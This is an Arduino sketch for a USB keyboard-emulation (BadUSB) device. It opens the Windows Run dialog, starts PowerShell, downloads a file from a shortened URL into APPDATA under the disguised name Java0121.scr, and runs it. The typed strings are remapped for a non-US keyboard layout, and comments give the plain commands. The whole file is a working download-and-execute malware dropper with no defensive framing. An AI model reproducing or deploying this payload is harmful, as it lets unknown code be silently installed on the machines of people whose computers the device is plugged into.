#include <Keyboard.h>

void setup() {
  Keyboard.begin();
delay(750);
    
type(KEY_LEFT_GUI,false);
type('r',false);
Keyboard.releaseAll();
delay(750);

print(F("powershell"));
delay(500);
   
type(KEY_RETURN,false);
Keyboard.releaseAll();
delay(500);
//print(F(",;.:-_´¨Ññ{Ç}`^[+*]'?¡¿0=9)8(7/6&5%4$3·21!º\|@#~€¬pPªoqaz<>"));
print(F("\npowershell Import/Module BitsTransfer<"));
delay(100);
print(F("\nStart/BitsTransfer /Source http>&&cort.as&/Gxs4 /Destination $env>APPDATA&Java0121.scr<"));  
                              //-Source http://cort.as/-Gxs4 -Destination $env:APPDATA/Java0121.scr;
delay(100);
print(F("\nStart/Process $env>APPDATA&Java0121.scr<"));
         //Start-Process $env:APPDATA/Java0121.scr;
delay(100);
print(F("\nexit"));
delay(100);
    
type(KEY_RETURN,false);
Keyboard.releaseAll();
Keyboard.end();
}
void type(int key, boolean release) {
  Keyboard.press(key);
  if(release)
    Keyboard.release(key);
}
void print(const __FlashStringHelper *value) {
  Keyboard.print(value);
}
void loop(){}
